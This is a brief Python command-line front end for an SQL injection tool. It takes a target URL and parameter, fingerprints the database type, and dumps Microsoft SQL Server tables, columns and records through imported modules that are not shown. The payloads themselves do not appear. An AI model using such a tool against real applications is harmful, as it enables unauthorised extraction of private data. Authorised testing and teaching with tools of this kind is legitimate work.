import reveal_MSSQL
import findDBMS
import argparse

def main():
    parser = argparse.ArgumentParser(description="Tool script to exploit SQL Injection.")
    
    parser.add_argument("--U", metavar="URL", required=True, help="URL")
    parser.add_argument("--R", action="store_true", help="Reveal DBMS type")
    parser.add_argument("--p", metavar="param", help="GET parameter")
    parser.add_argument("--t", action="store_true", help="Reveal tables information")
    parser.add_argument("--c", action="store_true", help="Reveal columns information in the --Table")
    parser.add_argument("--r", action="store_true", help="Reveal record information in the --Column of --Table")
    parser.add_argument("--T", metavar="Table", help="Table name")
    parser.add_argument("--C", metavar="Column", help="Column name")
    
    args = parser.parse_args()

    if args.R:
        findDBMS.set_params(args.U, 5)
        db_type = findDBMS.main()
        if db_type is None:
            print("[x] Cannot identify DBMS")
        else:
            print(f"[+] This application uses: {db_type}")
        return

    if args.p and (args.t or args.c or args.r):
        reveal_MSSQL.set_params(args.U, args.p, args.T, args.C)
        data = reveal_MSSQL.reveal_MSSQL(args.T,args.C)
        if data:
            print(data)
        else:
            print("[x] No data retrieved.")
    else:
        print("[x] Missing required parameters. Use --help for usage instructions.")

if __name__ == "__main__":
    main()
